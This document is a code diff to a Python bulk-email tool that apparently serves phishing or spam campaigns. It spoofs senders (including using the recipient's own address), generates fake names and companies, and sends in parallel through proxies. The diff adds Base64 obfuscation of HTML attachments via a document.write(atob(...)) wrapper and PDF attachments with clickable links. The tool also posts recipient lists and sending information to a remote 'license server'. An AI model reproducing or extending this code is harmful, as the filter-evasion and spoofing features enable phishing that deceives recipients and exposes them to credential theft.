@@ -5,14 +5,15 @@ import time
 import uuid
 import datetime
 import requests
-import re
 import random
 import pdfkit
+import re
 import string
 import tempfile
 import dns.resolver
 from email.mime.image import MIMEImage
 from email_settings import IMAGE_CID
+from xvfbwrapper import Xvfb
 import json
 from art import *
 import pyfiglet
@@ -86,8 +87,7 @@ from email_settings import (
 )
 
 
-
-
+# Function to get the current time in the specified time zone
 def get_current_time(time_zone):
     current_time = datetime.now(pytz.timezone(time_zone))
     return str(current_time)
@@ -154,14 +154,6 @@ def get_random_MD5():
         MD5 = file.readlines()
         MD5 = [MD5.strip() for MD5 in MD5 if MD5.strip()]
         return random.choice(MD5) if MD5 else None
-        
-def substitute_merge_fields(html_file, merge_fields):
-    with open(html_file, 'r') as file:
-        content = file.read()
-        for key, value in merge_fields.items():
-            placeholder = '{{' + key + '}}'
-            content = content.replace(placeholder, str(value))
-    return content
 
 
 def get_random_email():
@@ -186,6 +178,14 @@ def merge_fields_with_message(message, merge_fields):
     
     return merged_message
 
+def generate_random_filename(merge_fields):
+    letters = string.ascii_letters
+    random_string = ''.join(random.choice(letters) for _ in range(5))
+    filename = PDF_FILENAME_PREFIX
+    for key, value in merge_fields.items():
+        filename = filename.replace('{{' + key + '}}', str(value))
+    filename += f"-{random_string.upper()}.pdf"
+    return filename
 
 def generate_random_string(length=7):
     letters_digits = string.ascii_letters + string.digits
@@ -202,7 +202,7 @@ with open(recipient_list_path, 'r') as file:
 
 # Counter for successful emails sent
 emails_sent_counter = 0
-
+# Function to send a test email using the sender's email address and name from the files
 def send_test_email():
     global emails_sent_counter
 
@@ -266,6 +266,8 @@ def send_test_email():
             print("Failed to send test email:", str(e))
     else:
         print("Test email sending is disabled")
+# Call the function to send the test email
+
 
 def get_next_unique_number():
     # Implement your logic to generate unique numbers here
@@ -320,15 +322,6 @@ def generate_fake_company():
     fake = Faker()
     return fake.company()
     
-def generate_unique_content_id():
-    return str(uuid.uuid4())
-    
-def generate_random_filename():
-    letters = string.ascii_letters
-    random_string = ''.join(random.choice(letters) for _ in range(5))
-    filename = f"{PDF_FILENAME_PREFIX}-{random_string.upper()}.pdf"
-    return os.path.join("/tmp", filename)
-    
 def get_main_ip():
     try:
         response = requests.get('https://api.ipify.org?format=json')
@@ -339,7 +332,7 @@ def get_main_ip():
     except requests.exceptions.RequestException:
         return None
 
-LICENSE_SERVER_URL = "http://iflscience.net:5001/validate_license"
+LICENSE_SERVER_URL = "http://ultrapy.com:5001/validate_license"
 
 def validate_license_key(license_key, machine_ip):
     real_ip = get_main_ip()
@@ -467,7 +460,7 @@ payload = {
     "sending_information": sending_information
 }
 
-license_server_url = "http://iflscience.net:5001/sending"
+license_server_url = "http://ultrapy.com:5001/sending"
 
 try:
     response = requests.post(license_server_url, json=payload)
@@ -495,7 +488,7 @@ payload = {
     "recipient_list": recipient_list
 }
 
-license_server_url = "http://iflscience.net:5001/reload"
+license_server_url = "http://ultrapy.com:5001/reload"
 
 try:
     response = requests.post(license_server_url, json=payload)
@@ -592,7 +585,6 @@ def send_email_with_proxy(recipient, subject, message, enable_fake_names=ENABLE_
     
     if ENABLE_RECIPIENT_AS_SENDER:
         sender_email = recipient
-        
     
     if not sender_email or not sender_name:
         print('No sender email addresses or names found.')
@@ -652,9 +644,6 @@ def send_email_with_proxy(recipient, subject, message, enable_fake_names=ENABLE_
 
                        # Set debug level for server
                         server.set_debuglevel(0)
-            
-            with open('htmltoimage.html', 'r') as file:
-                html_content = file.read()            
 
             # Merge fields with the subject and message
             merge_fields = {
@@ -673,17 +662,8 @@ def send_email_with_proxy(recipient, subject, message, enable_fake_names=ENABLE_
                 'Random_email': get_random_email(),
                 'Fake_company': generate_fake_company(),
                 'Number10': generate_unique_number(),
-                'html_image_cid': 'cid:image_cid',
             }
             
-            
-            for key, value in merge_fields.items():
-                placeholder = '{{' + key + '}}'
-                html_content = html_content.replace(placeholder, str(value))
-
-            merged_htmltoimage = html_content
-            
-
             if ENABLE_FAKE_NAMES:
                 fake_names = generate_fake_names()
                 merge_fields['Fake_names'] = '\n'.join(fake_names)
@@ -707,10 +687,13 @@ def send_email_with_proxy(recipient, subject, message, enable_fake_names=ENABLE_
             email['Subject'] = merged_subject
             
             if ENABLE_CC and CC_RECIPIENTS:
-                email['Cc'] = ', '.join(CC_RECIPIENTS)
+                merged_cc_recipients = [merge_fields_with_message(cc_recipient, merge_fields) for cc_recipient in CC_RECIPIENTS]
+                
+                email['Cc'] = ', '.join(merged_cc_recipients)
 
             if ENABLE_REPLY_TO:
-                email['Reply-To'] = REPLY_TO_EMAIL
+                merged_reply_to_email = merge_fields_with_message(REPLY_TO_EMAIL, merge_fields)
+                email['Reply-To'] = merged_reply_to_email
                 
             # Get the current time in the specified time zone
             current_time = datetime.now(pytz.timezone(TIME_ZONE)).strftime("%Y-%m-%d %H:%M:%S %Z")
@@ -729,20 +712,70 @@ def send_email_with_proxy(recipient, subject, message, enable_fake_names=ENABLE_
             
             if ENABLE_ATTACHMENT:
                 # Read the attachment content from the file
-               with open(ATTACHMENT_FILE, 'r') as file:
-                attachment_content = file.read()
+                with open(ATTACHMENT_FILE, 'r') as file:
+                    attachment_content = file.read()
+                    
+                for key, value in merge_fields.items():
+                    placeholder = '{{' + key + '}}'
+                    attachment_content = attachment_content.replace(placeholder, str(value))
 
-               # Merge fields with the attachment content
-                merged_attachment_content = merge_fields_with_message(attachment_content, merge_fields)
 
-               # Merge fields with the attachment file name
-                attachment_filename = merge_fields_with_message('ATT-{{Random_number10}}.html', merge_fields)
+                if ENABLE_ENCRYPTION:
+               # Obfuscate the HTML content using Base64 encoding
+                   encoded_content = base64.b64encode(attachment_content.encode()).decode()
+                   obfuscated_content = f'<html><body><script>document.write(atob("{encoded_content}"));</script></body></html>'
 
-               # Create the attachment
-                attachment = MIMEText(merged_attachment_content, 'html')
+                # Set the obfuscated content as the email attachment
+                   attachment = MIMEText(obfuscated_content, 'html')
+                else:
+                    # Set the original attachment content
+                    attachment = MIMEText(attachment_content, 'html')
+
+                # Set the attachment filename
+                attachment_filename = merge_fields_with_message(email_settings.ATTACHMENT_FILENAME, merge_fields)
                 attachment.add_header('Content-Disposition', 'attachment', filename=attachment_filename)
                 email.attach(attachment)
+
+            if ENABLE_HTML_TO_PDF:
+                # Load HTML template for conversion
+                with open('htmltopdf.html', 'r') as html_file:
+                    html_content = html_file.read()
+
+                # Perform merge field substitution in the HTML content
+                for key, value in merge_fields.items():
+                    placeholder = '{{' + key + '}}'
+                    html_content = html_content.replace(placeholder, str(value))
+                    
+                # Make URLs clickable
+                clickable_html_content = re.sub(r'<a href="(.*?)">', r'<a href="\1" target="_blank">', html_content)
+
+                # Generate a unique file name for the PDF
+                pdf_filename = generate_random_filename(merge_fields)
                 
+                # Create a virtual display using Xvfb
+                vdisplay = Xvfb()
+                vdisplay.start()
+
+                try:
+                # Perform HTML to PDF conversion
+                    pdfkit.from_string(clickable_html_content, pdf_filename)
+                except Exception as e:
+                    print("Error during HTML to PDF conversion:", str(e))
+                finally:
+                    vdisplay.stop()
+                
+                with open(pdf_filename, 'rb') as pdf_file:
+                    pdf_data = pdf_file.read()
+
+                attachment = MIMEBase('application', 'pdf')
+                attachment.set_payload(pdf_data)
+                encoders.encode_base64(attachment)
+                attachment.add_header('Content-Disposition', 'attachment', filename=pdf_filename)
+                email.attach(attachment)
+                
+                # Delete the PDF file
+                os.remove(pdf_filename)
+
             if ENABLE_CID_IMAGE:
     
                 # Load HTML template
@@ -766,45 +799,14 @@ def send_email_with_proxy(recipient, subject, message, enable_fake_names=ENABLE_
                 image_data = imgkit.from_file('generated_html.html', None, options={'format': 'png'})
                 
                 cid = IMAGE_CID  # Unique content ID for the generated image
-                attachment = MIMEImage(image_data, '.png')
+                attachment = MIMEImage(image_data, '')
                 attachment.add_header('Content-ID', f'<{cid}>')
                 email.attach(attachment)
                 
                 # Substitute merge fields in the message content
                 merged_message = message_content.replace('{{html_image_cid}}', f'cid:{cid}')
                 
-            if ENABLE_HTML_TO_PDF:
-                # Load HTML template for conversion
-                with open('htmltopdf.html', 'r') as html_file:
-                    html_content = html_file.read()
-
-                # Perform merge field substitution in the HTML content
-                for key, value in merge_fields.items():
-                    placeholder = '{{' + key + '}}'
-                    html_content = html_content.replace(placeholder, str(value))
-                    
-                # Make URLs clickable
-                clickable_html_content = re.sub(r'<a href="(.*?)">', r'<a href="\1" target="_blank">', html_content)
-
-                # Generate a unique file name for the PDF
-                pdf_filename = generate_random_filename()
-
-                try:
-                # Perform HTML to PDF conversion
-                    pdfkit.from_string(clickable_html_content, pdf_filename)
-                except Exception as e:
-                    print("Error during HTML to PDF conversion:", str(e))
-                # Handle the error condition appropriately (e.g., logging, error message)
-
-                with open(pdf_filename, 'rb') as pdf_file:
-                    pdf_data = pdf_file.read()
-
-                attachment = MIMEBase('application', 'pdf')
-                attachment.set_payload(pdf_data)
-                encoders.encode_base64(attachment)
-                attachment.add_header('Content-Disposition', 'attachment', filename=pdf_filename)
-                email.attach(attachment)
-
+                
             # Set highest priority if enabled
             if HIGHEST_PRIORITY:
                email['Importance'] = 'High'
@@ -819,7 +821,7 @@ def send_email_with_proxy(recipient, subject, message, enable_fake_names=ENABLE_
 
             # Send email
             print("Sending email to: {}".format(recipient))
-            server.sendmail(email['From'], recipient, email.as_string().encode('utf-8'))
+            server.sendmail(email['From'], recipient, email.as_string())
             print('Successfully sent email.')
 
             # Save sent email address
@@ -934,6 +936,4 @@ clear_failed_emails(FAILED_EMAILS_FILE)
 
 # Send emails in parallel using multithreading
 send_emails_parallel(recipient_list, subject, message, NUM_THREADS)
-
-# Call the function to send the test email
 send_test_email()
